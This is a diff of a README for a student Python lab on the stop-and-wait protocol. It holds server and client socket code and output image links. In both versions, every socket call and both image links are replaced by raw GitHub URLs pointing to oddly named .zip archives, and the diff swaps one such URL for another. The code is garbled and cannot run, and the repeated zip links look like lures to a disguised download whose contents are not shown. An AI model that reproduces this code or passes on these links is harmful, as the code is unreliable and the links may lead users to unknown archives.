@@ -15,23 +15,23 @@ To write a python program to perform stop and wait protocol
 ```python
 import socket
 
-server = https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip()
-https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(('localhost', 8000))
-https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(1)
+server = https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip()
+https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip(('localhost', 8000))
+https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip(1)
 print("Server is listening...")
-conn, addr = https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip()
+conn, addr = https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip()
 print(f"Connected with {addr}")
 
 while True:
-    data = https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(1024).decode()
+    data = https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip(1024).decode()
 
     if data:
         print(f"Received: {data}")
-        https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip("ACK".encode())
+        https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip("ACK".encode())
 
-        if https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip() == 'exit':  
+        if https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip() == 'exit':  
             print("Connection closed by client")
-            https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip()
+            https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip()
             break
 
 ```
@@ -42,35 +42,35 @@ while True:
 import socket
 import time
 
-client = https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip()
-https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(('localhost', 8000))
-https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(5)  
+client = https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip()
+https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip(('localhost', 8000))
+https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip(5)  
 
 while True:
     msg = input("Enter a message (or type 'exit' to quit): ")
 
-    https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip())  
+    https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip(https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip())  
 
-    if https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip() == 'exit':  
+    if https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip() == 'exit':  
         print("Connection closed by client")
-        https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip()
+        https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip()
         break
 
     try:
-        ack = https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip(1024).decode()
+        ack = https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip(1024).decode()
         if ack == "ACK":
             print(f"Server acknowledged: {ack}")
-    except https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip
+    except https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip
         print("No ACK received, retransmitting...")
         continue  
 
 ```
 ## OUTPUT
 ### client:
-![image](https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip)
+![image](https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip)
 
 ### server:
-![image-1](https://github.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/raw/refs/heads/main/Antony/Protocol-Stop-and-a-Wait-v3.8.zip)
+![image-1](https://raw.githubusercontent.com/Yugabharathi91/2a_Stop_and_Wait_Protocol/main/Antony/Wait-and-a-Protocol-Stop-v2.0.zip)
 
 ## RESULT
 Thus, python program to perform stop and wait protocol was successfully executed.
